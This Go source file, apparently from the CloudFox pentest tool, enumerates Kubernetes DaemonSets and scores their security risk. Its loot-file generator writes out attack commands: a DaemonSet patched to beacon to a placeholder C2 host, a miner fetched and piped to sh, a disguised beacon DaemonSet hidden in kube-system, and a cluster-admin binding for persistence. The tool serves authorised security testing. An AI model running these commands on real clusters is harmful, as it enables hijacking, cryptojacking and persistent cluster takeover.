package commands

import (
	"context"
	"fmt"
	"sort"
	"strings"

	"github.com/BishopFox/cloudfox/globals"
	"github.com/BishopFox/cloudfox/internal"
	k8sinternal "github.com/BishopFox/cloudfox/internal/kubernetes"
	"github.com/BishopFox/cloudfox/kubernetes/config"
	"github.com/BishopFox/cloudfox/kubernetes/shared"
	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
)

var DaemonSetsCmd = &cobra.Command{
	Use:     "daemonsets",
	Aliases: []string{"ds"},
	Short:   "List all cluster DaemonSets",
	Long: `
List all cluster DaemonSets (controller-level and template-level information):
  cloudfox kubernetes daemonsets`,
	Run: ListDaemonSets,
}

type DaemonSetsOutput struct {
	Table []internal.TableFile
	Loot  []internal.LootFile
}

func (t DaemonSetsOutput) TableFiles() []internal.TableFile { return t.Table }
func (t DaemonSetsOutput) LootFiles() []internal.LootFile   { return t.Loot }

type DaemonSetFinding struct {
	Namespace         string
	Name              string
	RiskLevel         string
	RiskScore         int
	SecurityIssues    []string
	BackdoorPatterns  []string
	ReverseShells     []string
	CryptoMiners      []string
	DataExfiltration  []string
	ContainerEscape   []string
	NodeCompromise    []string
	DesiredNodes      int32
	CurrentNodes      int32
	ReadyNodes        int32
	ServiceAccount    string
	Containers        []DaemonSetContainer
	ImageRegistry     string
	ImageTags         []string
	HostPID           bool
	HostIPC           bool
	HostNetwork       bool
	Privileged        bool
	HostPaths         []string
	Volumes           []DaemonSetVolume
	RunAsUser         string
	Capabilities      []string
	NodeSelector      map[string]string
	Tolerations       []string
	Labels            map[string]string
	Annotations       map[string]string
	InitContainers    int
	ImagePullSecrets  []string
	Secrets           []string
	ConfigMaps        []string
	Affinity          string
	CloudProvider     string
	CloudRole         string
	Commands          []string
	Args              []string
	EnvVars           []string
	CreationTimestamp string
}

type DaemonSetContainer struct {
	Name           string
	Image          string
	Tag            string
	Registry       string
	Command        string
	Args           string
	Privileged     bool
	Capabilities   []string
	RunAsUser      string
	AllowPrivEsc   string
	ReadOnlyRootFS string
	ResourceLimits string
}

type DaemonSetVolume struct {
	Name       string
	VolumeType string
	Source     string
	MountPath  string
	ReadOnly   bool
}

func ListDaemonSets(cmd *cobra.Command, args []string) {
	ctx, cancel := shared.ContextWithTimeout()
	defer cancel()
	logger := internal.NewLogger()

	parentCmd := cmd.Parent()
	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
	outputDirectory, _ := parentCmd.PersistentFlags().GetString("outdir")
	format, _ := parentCmd.PersistentFlags().GetString("output")

	logger.InfoM(fmt.Sprintf("Enumerating daemonsets for %s", globals.ClusterName), globals.K8S_DAEMONSETS_MODULE_NAME)

	clientset := config.GetClientOrExit()

	daemonSets, err := clientset.AppsV1().DaemonSets(shared.GetNamespaceOrAll()).List(ctx, metav1.ListOptions{})
	if err != nil {
		shared.LogListError(&logger, "daemonsets", "", err, globals.K8S_DAEMONSETS_MODULE_NAME, true)
		return
	}

	// Table 1: DaemonSets Summary
	summaryHeaders := []string{
		"Namespace", "Name", "Labels", "Nodes (Desired/Current/Ready)",
		"Service Account", "Init Containers", "Image Pull Secrets",
		"Secrets", "ConfigMaps",
		"Security Context", "Suspicious Patterns", "Cloud IAM",
		"Affinity", "Tolerations",
	}

	// Table 2: DaemonSet-Containers Detail
	containerHeaders := []string{
		"Namespace", "DaemonSet", "Container", "Privileged", "Capabilities",
		"RunAsUser", "AllowPrivEsc", "ReadOnlyRootFS", "Resource Limits",
		"Image", "Tag", "Registry",
	}

	// Table 3: DaemonSet-Volumes Detail
	volumeHeaders := []string{
		"Namespace", "DaemonSet", "Volume Name", "Type", "Source Path/Name", "Container Mount Path", "Read Only",
	}

	var summaryRows [][]string
	var containerRows [][]string
	var volumeRows [][]string
	var findings []DaemonSetFinding

	// Risk counters
	riskCounts := shared.NewRiskCounts()

	for _, ds := range daemonSets.Items {
		spec := ds.Spec.Template.Spec

		// Run comprehensive security analysis
		finding := analyzeDaemonSetSecurity(
			ctx,
			clientset,
			ds.Namespace,
			ds.Name,
			ds.Status.DesiredNumberScheduled,
			ds.Status.CurrentNumberScheduled,
			ds.Status.NumberReady,
			spec,
			spec.NodeSelector,
			ds.Spec.Template.Annotations,
		)

		findings = append(findings, finding)

		// Count risk levels
		riskCounts.Add(finding.RiskLevel)

		// Merge all suspicious patterns into one column
		suspiciousPatternsStr := strings.Join(finding.BackdoorPatterns, "; ")

		// Merge security context - only show pod-level settings that are enabled
		var secContextParts []string
		if finding.HostPID {
			secContextParts = append(secContextParts, "HostPID")
		}
		if finding.HostIPC {
			secContextParts = append(secContextParts, "HostIPC")
		}
		if finding.HostNetwork {
			secContextParts = append(secContextParts, "HostNetwork")
		}
		for _, hp := range finding.HostPaths {
			secContextParts = append(secContextParts, fmt.Sprintf("HostPath:%s", hp))
		}
		secContextStr := strings.Join(secContextParts, ", ")

		// Merge cloud provider and role
		var cloudIAMStr string
		if finding.CloudProvider != "" && finding.CloudRole != "" {
			cloudIAMStr = fmt.Sprintf("%s: %s", finding.CloudProvider, finding.CloudRole)
		}

		nodeStats := fmt.Sprintf("%d/%d/%d", finding.DesiredNodes, finding.CurrentNodes, finding.ReadyNodes)

		// Format labels for display
		var labelParts []string
		for k, v := range finding.Labels {
			labelParts = append(labelParts, fmt.Sprintf("%s=%s", k, v))
		}
		labelsStr := strings.Join(labelParts, ", ")

		// Format init containers count
		initContainersStr := ""
		if finding.InitContainers > 0 {
			initContainersStr = fmt.Sprintf("%d", finding.InitContainers)
		}

		// Format image pull secrets
		imagePullSecretsStr := strings.Join(finding.ImagePullSecrets, ", ")

		// Format secrets
		secretsStr := strings.Join(finding.Secrets, ", ")

		// Format configmaps
		configMapsStr := strings.Join(finding.ConfigMaps, ", ")

		// Format tolerations
		tolerationsStr := strings.Join(finding.Tolerations, ", ")

		// Table 1: Summary row
		summaryRow := []string{
			finding.Namespace,
			finding.Name,
			k8sinternal.NonEmpty(labelsStr),
			nodeStats,
			k8sinternal.NonEmpty(finding.ServiceAccount),
			k8sinternal.NonEmpty(initContainersStr),
			k8sinternal.NonEmpty(imagePullSecretsStr),
			k8sinternal.NonEmpty(secretsStr),
			k8sinternal.NonEmpty(configMapsStr),
			k8sinternal.NonEmpty(secContextStr),
			k8sinternal.NonEmpty(suspiciousPatternsStr),
			k8sinternal.NonEmpty(cloudIAMStr),
			k8sinternal.NonEmpty(finding.Affinity),
			k8sinternal.NonEmpty(tolerationsStr),
		}
		summaryRows = append(summaryRows, summaryRow)

		// Table 2: Container rows (one per container)
		for _, container := range finding.Containers {
			// Format capabilities
			capsStr := strings.Join(container.Capabilities, ", ")

			containerRow := []string{
				finding.Namespace,
				finding.Name,
				container.Name,
				fmt.Sprintf("%v", container.Privileged),
				k8sinternal.NonEmpty(capsStr),
				container.RunAsUser,
				container.AllowPrivEsc,
				container.ReadOnlyRootFS,
				k8sinternal.NonEmpty(container.ResourceLimits),
				container.Image,
				container.Tag,
				container.Registry,
			}
			containerRows = append(containerRows, containerRow)
		}

		// Table 3: Volume rows (one per volume)
		for _, volume := range finding.Volumes {
			volumeRow := []string{
				finding.Namespace,
				finding.Name,
				volume.Name,
				volume.VolumeType,
				volume.Source,
				volume.MountPath,
				fmt.Sprintf("%v", volume.ReadOnly),
			}
			volumeRows = append(volumeRows, volumeRow)
		}
	}

	// Generate comprehensive loot files
	lootFiles := generateDaemonSetLoot(findings, globals.KubeContext)

	// Create all three tables
	summaryTable := internal.TableFile{Name: "DaemonSets", Header: summaryHeaders, Body: summaryRows}
	containerTable := internal.TableFile{Name: "DaemonSet-Containers", Header: containerHeaders, Body: containerRows}
	volumeTable := internal.TableFile{Name: "DaemonSet-Volumes", Header: volumeHeaders, Body: volumeRows}

	err = internal.HandleOutput(
		"Kubernetes",
		format,
		outputDirectory,
		verbosity,
		wrap,
		"DaemonSets",
		globals.ClusterName,
		"results",
		DaemonSetsOutput{Table: []internal.TableFile{summaryTable, containerTable, volumeTable}, Loot: lootFiles},
	)
	if err != nil {
		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_DAEMONSETS_MODULE_NAME)
		return
	}

	if len(summaryRows) > 0 {
		logger.InfoM(fmt.Sprintf("%d daemonsets found", len(summaryRows)), globals.K8S_DAEMONSETS_MODULE_NAME)
		logger.InfoM(fmt.Sprintf("Risk Summary: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
			riskCounts.Critical, riskCounts.High, riskCounts.Medium, riskCounts.Low), globals.K8S_DAEMONSETS_MODULE_NAME)

		if riskCounts.Critical > 0 {
			logger.InfoM(fmt.Sprintf("⚠️  %d CRITICAL risk daemonsets detected! Check DaemonSet-Node-Compromise loot file", riskCounts.Critical), globals.K8S_DAEMONSETS_MODULE_NAME)
		}
		if riskCounts.High > 0 {
			logger.InfoM(fmt.Sprintf("⚠️  %d HIGH risk daemonsets detected! Check DaemonSet-Node-Compromise loot file", riskCounts.High), globals.K8S_DAEMONSETS_MODULE_NAME)
		}
	} else {
		logger.InfoM("No daemonsets found, skipping output file creation", globals.K8S_DAEMONSETS_MODULE_NAME)
	}

	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_DAEMONSETS_MODULE_NAME), globals.K8S_DAEMONSETS_MODULE_NAME)
}

// --- Security Analysis Functions ---

// detectNodeCompromise checks for DaemonSet-specific node compromise indicators
func detectNodeCompromise(hostPaths []string, capabilities []string, hostPID, hostIPC, hostNetwork, privileged bool) []string {
	var findings []string

	// DaemonSets with these combinations are designed for node compromise
	if privileged && hostPID {
		findings = append(findings, "Privileged + HostPID: Can access all node processes")
	}

	if privileged && len(hostPaths) > 0 {
		findings = append(findings, "Privileged + HostPaths: Can modify node filesystem")
	}

	if hostNetwork && hostPID {
		findings = append(findings, "HostNetwork + HostPID: Full node network visibility")
	}

	// Check for dangerous capabilities
	dangerousCaps := []string{"SYS_ADMIN", "SYS_PTRACE", "SYS_MODULE", "DAC_OVERRIDE", "DAC_READ_SEARCH"}
	for _, cap := range capabilities {
		for _, danger := range dangerousCaps {
			if strings.Contains(cap, danger) {
				findings = append(findings, fmt.Sprintf("Dangerous capability: %s", danger))
			}
		}
	}

	// Check for specific hostPath targets
	for _, hp := range hostPaths {
		// Extract just the path part (before colon if mount point included)
		path := strings.Split(hp, ":")[0]

		if strings.Contains(path, "/var/lib/kubelet") {
			findings = append(findings, "HostPath: /var/lib/kubelet (access to all pod secrets)")
		}
		if strings.Contains(path, "/etc/kubernetes") {
			findings = append(findings, "HostPath: /etc/kubernetes (cluster configuration)")
		}
		if strings.Contains(path, "/var/log") {
			findings = append(findings, "HostPath: /var/log (node log access)")
		}
		if strings.Contains(path, "/proc") {
			findings = append(findings, "HostPath: /proc (process information)")
		}
		if strings.Contains(path, "/sys") {
			findings = append(findings, "HostPath: /sys (kernel parameters)")
		}
		if strings.Contains(path, "/dev") {
			findings = append(findings, "HostPath: /dev (device access)")
		}
	}

	return findings
}

func analyzeDaemonSetSecurity(
	ctx context.Context,
	clientset *kubernetes.Clientset,
	namespace string,
	name string,
	desiredNodes int32,
	currentNodes int32,
	readyNodes int32,
	podSpec v1.PodSpec,
	nodeSelector map[string]string,
	annotations map[string]string,
) DaemonSetFinding {

	finding := DaemonSetFinding{
		Namespace:      namespace,
		Name:           name,
		DesiredNodes:   desiredNodes,
		CurrentNodes:   currentNodes,
		ReadyNodes:     readyNodes,
		ServiceAccount: podSpec.ServiceAccountName,
		HostPID:        podSpec.HostPID,
		HostIPC:        podSpec.HostIPC,
		HostNetwork:    podSpec.HostNetwork,
		NodeSelector:   nodeSelector,
		Annotations:    annotations,
		InitContainers: len(podSpec.InitContainers),
	}

	// Image Pull Secrets
	for _, ps := range podSpec.ImagePullSecrets {
		finding.ImagePullSecrets = append(finding.ImagePullSecrets, ps.Name)
	}

	// Affinity
	if podSpec.Affinity != nil {
		finding.Affinity = k8sinternal.PrettyPrintAffinity(podSpec.Affinity)
	}

	// Tolerations - full details
	for _, t := range podSpec.Tolerations {
		tolStr := ""
		if t.Key != "" {
			tolStr = t.Key
			if t.Value != "" {
				tolStr += "=" + t.Value
			}
		} else {
			tolStr = "*"
		}
		if t.Effect != "" {
			tolStr += ":" + string(t.Effect)
		}
		tolStr += fmt.Sprintf(" (%s)", t.Operator)
		if t.TolerationSeconds != nil {
			tolStr += fmt.Sprintf(" [%ds]", *t.TolerationSeconds)
		}
		finding.Tolerations = append(finding.Tolerations, tolStr)
	}

	// Extract containers, commands, args, images
	var containers []DaemonSetContainer
	var allCommands []string
	var allArgs []string
	var allImages []string
	var allEnvVars []string
	var capabilities []string
	privileged := false
	runAsUser := "<NONE>"

	for _, c := range podSpec.Containers {
		// Parse image into components
		image := c.Image
		tag := "latest"
		registry := "docker.io"

		if strings.Contains(image, ":") {
			parts := strings.SplitN(image, ":", 2)
			image = parts[0]
			tag = parts[1]
		}
		if strings.Contains(image, "/") {
			parts := strings.Split(image, "/")
			if strings.Contains(parts[0], ".") || parts[0] == "localhost" {
				registry = parts[0]
			}
		}

		// Security context - per container
		containerPrivileged := false
		var containerCaps []string
		containerRunAsUser := "-"
		containerAllowPrivEsc := "true" // default is true if not specified
		containerReadOnlyRootFS := "false"
		containerResourceLimits := "-"
		if c.SecurityContext != nil {
			if c.SecurityContext.Privileged != nil && *c.SecurityContext.Privileged {
				containerPrivileged = true
				privileged = true
			}
			if c.SecurityContext.RunAsUser != nil {
				runAsUser = fmt.Sprintf("%d", *c.SecurityContext.RunAsUser)
				containerRunAsUser = runAsUser
			}
			if c.SecurityContext.AllowPrivilegeEscalation != nil {
				containerAllowPrivEsc = fmt.Sprintf("%v", *c.SecurityContext.AllowPrivilegeEscalation)
			}
			if c.SecurityContext.ReadOnlyRootFilesystem != nil {
				containerReadOnlyRootFS = fmt.Sprintf("%v", *c.SecurityContext.ReadOnlyRootFilesystem)
			}
			if c.SecurityContext.Capabilities != nil {
				for _, cap := range c.SecurityContext.Capabilities.Add {
					containerCaps = append(containerCaps, string(cap))
					capabilities = append(capabilities, string(cap))
				}
			}
		}

		// Build actual resource limits string
		if c.Resources.Limits != nil && len(c.Resources.Limits) > 0 {
			var limitParts []string
			if cpu, ok := c.Resources.Limits["cpu"]; ok {
				limitParts = append(limitParts, fmt.Sprintf("cpu:%s", cpu.String()))
			}
			if mem, ok := c.Resources.Limits["memory"]; ok {
				limitParts = append(limitParts, fmt.Sprintf("mem:%s", mem.String()))
			}
			if len(limitParts) > 0 {
				containerResourceLimits = strings.Join(limitParts, ", ")
			}
		}

		container := DaemonSetContainer{
			Name:           c.Name,
			Image:          c.Image,
			Tag:            tag,
			Registry:       registry,
			Command:        strings.Join(c.Command, " "),
			Args:           strings.Join(c.Args, " "),
			Privileged:     containerPrivileged,
			Capabilities:   containerCaps,
			RunAsUser:      containerRunAsUser,
			AllowPrivEsc:   containerAllowPrivEsc,
			ReadOnlyRootFS: containerReadOnlyRootFS,
			ResourceLimits: containerResourceLimits,
		}
		containers = append(containers, container)

		allImages = append(allImages, c.Image)
		allCommands = append(allCommands, c.Command...)
		allArgs = append(allArgs, c.Args...)

		// Collect environment variables
		for _, env := range c.Env {
			if env.Value != "" {
				allEnvVars = append(allEnvVars, fmt.Sprintf("%s=%s", env.Name, env.Value))
			}
		}
	}

	finding.Containers = containers
	finding.Commands = allCommands
	finding.Args = allArgs
	finding.Privileged = privileged
	finding.RunAsUser = runAsUser
	finding.Capabilities = capabilities
	finding.EnvVars = allEnvVars

	// Extract image registry and tags
	if len(allImages) > 0 {
		img := allImages[0]
		if strings.Contains(img, "/") {
			parts := strings.Split(img, "/")
			finding.ImageRegistry = parts[0]
		}

		for _, img := range allImages {
			if strings.Contains(img, ":") {
				tag := strings.Split(img, ":")[1]
				finding.ImageTags = append(finding.ImageTags, tag)
			}
		}
	}

	// Extract volumes and hostPaths
	var volumes []DaemonSetVolume
	var hostPaths []string
	for _, v := range podSpec.Volumes {
		volume := DaemonSetVolume{
			Name: v.Name,
		}

		// Determine volume type and source
		if v.HostPath != nil {
			volume.VolumeType = "HostPath"
			volume.Source = v.HostPath.Path
			hostPaths = append(hostPaths, v.HostPath.Path)
		} else if v.Secret != nil {
			volume.VolumeType = "Secret"
			volume.Source = v.Secret.SecretName
			finding.Secrets = append(finding.Secrets, v.Secret.SecretName)
		} else if v.ConfigMap != nil {
			volume.VolumeType = "ConfigMap"
			volume.Source = v.ConfigMap.Name
			finding.ConfigMaps = append(finding.ConfigMaps, v.ConfigMap.Name)
		} else if v.EmptyDir != nil {
			volume.VolumeType = "EmptyDir"
			volume.Source = "-"
		} else if v.PersistentVolumeClaim != nil {
			volume.VolumeType = "PVC"
			volume.Source = v.PersistentVolumeClaim.ClaimName
		} else if v.Projected != nil {
			volume.VolumeType = "Projected"
			volume.Source = "-"
		} else if v.DownwardAPI != nil {
			volume.VolumeType = "DownwardAPI"
			volume.Source = "-"
		} else {
			volume.VolumeType = "Other"
			volume.Source = "-"
		}

		// Find mount path and read-only status
		for _, container := range podSpec.Containers {
			for _, vm := range container.VolumeMounts {
				if vm.Name == v.Name {
					volume.MountPath = vm.MountPath
					volume.ReadOnly = vm.ReadOnly
					break
				}
			}
		}

		volumes = append(volumes, volume)
	}
	finding.Volumes = volumes
	finding.HostPaths = hostPaths

	// Cloud role detection
	if podSpec.ServiceAccountName != "" {
		roleResults := k8sinternal.DetectCloudRole(
			ctx,
			clientset,
			namespace,
			podSpec.ServiceAccountName,
			&podSpec,
			annotations,
		)
		if len(roleResults) > 0 {
			finding.CloudProvider = roleResults[0].Provider
			finding.CloudRole = roleResults[0].Role
		}
	}

	// Run security detection
	finding.ReverseShells = shared.DetectReverseShells(allCommands, allArgs)
	finding.CryptoMiners = shared.DetectCryptoMiners(allCommands, allArgs, allImages)
	finding.DataExfiltration = shared.DetectDataExfiltration(allCommands, allArgs)
	finding.ContainerEscape = shared.DetectContainerEscape(allCommands, allArgs, hostPaths)
	finding.NodeCompromise = detectNodeCompromise(hostPaths, capabilities, podSpec.HostPID, podSpec.HostIPC, podSpec.HostNetwork, privileged)

	// Combine all backdoor patterns
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ReverseShells...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.CryptoMiners...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.DataExfiltration...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.ContainerEscape...)
	finding.BackdoorPatterns = append(finding.BackdoorPatterns, finding.NodeCompromise...)

	// Calculate risk level
	finding.RiskLevel = calculateDaemonSetRiskLevel(finding)

	// Calculate risk score (0-100)
	finding.RiskScore = calculateDaemonSetRiskScore(finding)

	// Generate security issues
	finding.SecurityIssues = generateDaemonSetSecurityIssues(finding)

	return finding
}

func calculateDaemonSetRiskLevel(finding DaemonSetFinding) string {
	// CRITICAL: Active backdoors, reverse shells, crypto miners
	if len(finding.ReverseShells) > 0 {
		return shared.RiskCritical
	}
	if len(finding.CryptoMiners) > 0 {
		return shared.RiskCritical
	}
	// DaemonSets running on ALL nodes with container escape = cluster-wide compromise
	if len(finding.ContainerEscape) > 0 && finding.DesiredNodes > 5 {
		return shared.RiskCritical
	}
	// Privileged DaemonSet with hostPath to root or runtime sockets
	if finding.Privileged && len(finding.HostPaths) > 0 {
		for _, hp := range finding.HostPaths {
			if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") ||
				hp == "/" || hp == "/:" || strings.HasPrefix(hp, "/:") {
				return shared.RiskCritical
			}
		}
	}

	// HIGH: Data exfiltration, node compromise indicators, privileged + host access
	if len(finding.DataExfiltration) > 0 {
		return shared.RiskHigh
	}
	if len(finding.NodeCompromise) >= 3 {
		return shared.RiskHigh
	}
	if len(finding.ContainerEscape) > 0 {
		return shared.RiskHigh
	}
	if finding.Privileged && (finding.HostPID || finding.HostIPC) {
		return shared.RiskHigh
	}
	// DaemonSets with dangerous capabilities
	for _, cap := range finding.Capabilities {
		if strings.Contains(cap, "SYS_ADMIN") || strings.Contains(cap, "SYS_MODULE") {
			return shared.RiskHigh
		}
	}

	// MEDIUM: HostNetwork, some node compromise, cloud roles
	if finding.HostNetwork {
		return shared.RiskMedium
	}
	if len(finding.NodeCompromise) > 0 {
		return shared.RiskMedium
	}
	if finding.CloudRole != "" && finding.CloudRole != "<NONE>" {
		return shared.RiskMedium
	}
	if finding.Privileged {
		return shared.RiskMedium
	}
	if finding.HostPID || finding.HostIPC {
		return shared.RiskMedium
	}

	// LOW: Standard daemonset
	return shared.RiskLow
}

func generateDaemonSetLoot(findings []DaemonSetFinding, kubeContext string) []internal.LootFile {
	var lootContent []string
	var entrypointsContent []string

	// Separate findings by risk level
	var critical, high []DaemonSetFinding
	for _, f := range findings {
		switch f.RiskLevel {
		case shared.RiskCritical:
			critical = append(critical, f)
		case shared.RiskHigh:
			high = append(high, f)
		}
	}

	// Sort by namespace, then name
	sortFindings := func(findings []DaemonSetFinding) {
		sort.Slice(findings, func(i, j int) bool {
			if findings[i].Namespace != findings[j].Namespace {
				return findings[i].Namespace < findings[j].Namespace
			}
			return findings[i].Name < findings[j].Name
		})
	}
	sortFindings(critical)
	sortFindings(high)

	// ========================================
	// DaemonSet-Commands.txt - Consolidated commands
	// ========================================
	lootContent = append(lootContent, "########################################")
	lootContent = append(lootContent, "##### DaemonSet Commands")
	lootContent = append(lootContent, "########################################")
	lootContent = append(lootContent, "")

	if kubeContext != "" {
		lootContent = append(lootContent, fmt.Sprintf("kubectl config use-context %s", kubeContext))
		lootContent = append(lootContent, "")
	}

	// === ENUMERATION ===
	lootContent = append(lootContent, "=== ENUMERATION ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# List all daemonsets with their node counts")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o custom-columns=NAMESPACE:.metadata.namespace,NAME:.metadata.name,DESIRED:.status.desiredNumberScheduled,CURRENT:.status.currentNumberScheduled,READY:.status.numberReady,NODE-SELECTOR:.spec.template.spec.nodeSelector")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find privileged daemonsets")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.containers[]?.securityContext?.privileged == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find daemonsets with hostPID/hostIPC/hostNetwork")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.hostPID == true or .spec.template.spec.hostIPC == true or .spec.template.spec.hostNetwork == true) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find daemonsets with hostPath volumes")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.volumes[]?.hostPath != null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Find daemonsets with dangerous capabilities")
	lootContent = append(lootContent, "kubectl get daemonsets -A -o json | jq -r '.items[] | select(.spec.template.spec.containers[]?.securityContext?.capabilities?.add != null) | \"\\(.metadata.namespace)/\\(.metadata.name)\"'")
	lootContent = append(lootContent, "")

	// === HIGH RISK ===
	if len(critical) > 0 || len(high) > 0 {
		lootContent = append(lootContent, "=== HIGH RISK ===")
		lootContent = append(lootContent, "")

		for _, f := range critical {
			lootContent = append(lootContent, fmt.Sprintf("# [CRITICAL] %s/%s - Score: %d", f.Namespace, f.Name, f.RiskScore))
			lootContent = append(lootContent, fmt.Sprintf("kubectl get daemonset %s -n %s -o yaml", f.Name, f.Namespace))
			lootContent = append(lootContent, fmt.Sprintf("kubectl describe daemonset %s -n %s", f.Name, f.Namespace))
			if len(f.SecurityIssues) > 0 {
				for _, issue := range f.SecurityIssues {
					lootContent = append(lootContent, fmt.Sprintf("#   - %s", issue))
				}
			}
			lootContent = append(lootContent, "")
		}

		for _, f := range high {
			lootContent = append(lootContent, fmt.Sprintf("# [HIGH] %s/%s - Score: %d", f.Namespace, f.Name, f.RiskScore))
			lootContent = append(lootContent, fmt.Sprintf("kubectl get daemonset %s -n %s -o yaml", f.Name, f.Namespace))
			lootContent = append(lootContent, fmt.Sprintf("kubectl describe daemonset %s -n %s", f.Name, f.Namespace))
			lootContent = append(lootContent, "")
		}
	}

	// === EXPLOITATION ===
	lootContent = append(lootContent, "=== EXPLOITATION ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# DaemonSets run on EVERY node - perfect for cluster-wide attacks")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Modify existing DaemonSet for persistence")
	lootContent = append(lootContent, "kubectl patch daemonset <name> -n <namespace> --type=json -p='[{\"op\": \"add\", \"path\": \"/spec/template/spec/containers/0/command\", \"value\": [\"/bin/sh\", \"-c\", \"curl http://c2/beacon; sleep 3600\"]}]'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Deploy crypto miner DaemonSet (runs on all nodes)")
	lootContent = append(lootContent, "kubectl create daemonset miner -n kube-system --image=alpine -- sh -c 'wget -O - http://POOL/xmrig.sh | sh'")
	lootContent = append(lootContent, "")

	// === PERSISTENCE ===
	lootContent = append(lootContent, "=== PERSISTENCE ===")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Hide in kube-system namespace with legitimate-sounding names")
	lootContent = append(lootContent, "kubectl create daemonset kube-proxy-monitor -n kube-system --image=alpine -- sh -c 'curl http://c2/beacon'")
	lootContent = append(lootContent, "")
	lootContent = append(lootContent, "# Create ServiceAccount with cluster-admin for DaemonSet")
	lootContent = append(lootContent, "kubectl create sa persistence-sa -n kube-system")
	lootContent = append(lootContent, "kubectl create clusterrolebinding persistence-admin --clusterrole=cluster-admin --serviceaccount=kube-system:persistence-sa")
	lootContent = append(lootContent, "")

	// ========================================
	// DaemonSet-Entrypoints.txt - Container startup commands
	// ========================================
	entrypointsContent = append(entrypointsContent, "########################################")
	entrypointsContent = append(entrypointsContent, "##### DaemonSet Container Entrypoints")
	entrypointsContent = append(entrypointsContent, "########################################")
	entrypointsContent = append(entrypointsContent, "# Only containers with commands or args are shown")
	entrypointsContent = append(entrypointsContent, "")

	// Sort all findings by namespace/name for consistent output
	allFindings := make([]DaemonSetFinding, len(findings))
	copy(allFindings, findings)
	sortFindings(allFindings)

	for _, f := range allFindings {
		var containerEntries []string
		for _, c := range f.Containers {
			// Only include containers with non-empty command or args
			if c.Command != "" || c.Args != "" {
				containerEntries = append(containerEntries, fmt.Sprintf("Container: %s", c.Name))
				containerEntries = append(containerEntries, fmt.Sprintf("  Image: %s", c.Image))
				if c.Command != "" {
					containerEntries = append(containerEntries, fmt.Sprintf("  Command: %s", c.Command))
				}
				if c.Args != "" {
					containerEntries = append(containerEntries, fmt.Sprintf("  Args: %s", c.Args))
				}
				containerEntries = append(containerEntries, "")
			}
		}

		// Only add workload section if it has containers with commands/args
		if len(containerEntries) > 0 {
			entrypointsContent = append(entrypointsContent, fmt.Sprintf("=== %s/%s ===", f.Namespace, f.Name))
			entrypointsContent = append(entrypointsContent, "")
			entrypointsContent = append(entrypointsContent, containerEntries...)
		}
	}

	return []internal.LootFile{
		{Name: "DaemonSet-Commands", Contents: strings.Join(lootContent, "\n")},
		{Name: "DaemonSet-Entrypoints", Contents: strings.Join(entrypointsContent, "\n")},
	}
}

// calculateDaemonSetRiskScore calculates a numeric risk score (0-100)
func calculateDaemonSetRiskScore(finding DaemonSetFinding) int {
	score := 0

	// Backdoors and malicious activity (50 points max)
	if len(finding.ReverseShells) > 0 {
		score += 50
	}
	if len(finding.CryptoMiners) > 0 {
		score += 50
	}
	if len(finding.DataExfiltration) > 0 {
		score += 30
	}
	if len(finding.ContainerEscape) > 0 {
		score += 40
	}
	if len(finding.NodeCompromise) > 0 {
		score += 35
	}

	// Privileged access (30 points max)
	if finding.Privileged {
		score += 25
	}
	if finding.HostPID {
		score += 15
	}
	if finding.HostIPC {
		score += 10
	}
	if finding.HostNetwork {
		score += 15
	}

	// Dangerous hostPaths (20 points max)
	for _, hp := range finding.HostPaths {
		if strings.Contains(hp, "docker.sock") || strings.Contains(hp, "containerd.sock") {
			score += 20
			break
		} else if hp == "/" || hp == "/:" {
			score += 15
			break
		} else {
			score += 5
		}
	}

	// Dangerous capabilities (15 points max)
	dangerousCaps := []string{"SYS_ADMIN", "SYS_MODULE", "SYS_RAWIO", "SYS_PTRACE", "DAC_READ_SEARCH", "NET_ADMIN"}
	for _, cap := range finding.Capabilities {
		for _, dangerousCap := range dangerousCaps {
			if strings.Contains(cap, dangerousCap) {
				score += 5
				break
			}
		}
	}

	// Wide deployment (10 points max)
	if finding.DesiredNodes > 50 {
		score += 10
	} else if finding.DesiredNodes > 20 {
		score += 7
	} else if finding.DesiredNodes > 10 {
		score += 5
	}

	// Run as root (10 points)
	if finding.RunAsUser == "0" || finding.RunAsUser == "" {
		score += 10
	}

	// Cloud role with high privileges (10 points)
	if finding.CloudRole != "" && (strings.Contains(strings.ToLower(finding.CloudRole), "admin") ||
		strings.Contains(strings.ToLower(finding.CloudRole), "cluster")) {
		score += 10
	}

	// Cap at 100
	if score > 100 {
		score = 100
	}

	return score
}

// generateDaemonSetSecurityIssues creates a list of specific security issues and recommendations
func generateDaemonSetSecurityIssues(finding DaemonSetFinding) []string {
	var issues []string

	// Critical malicious activity
	if len(finding.ReverseShells) > 0 {
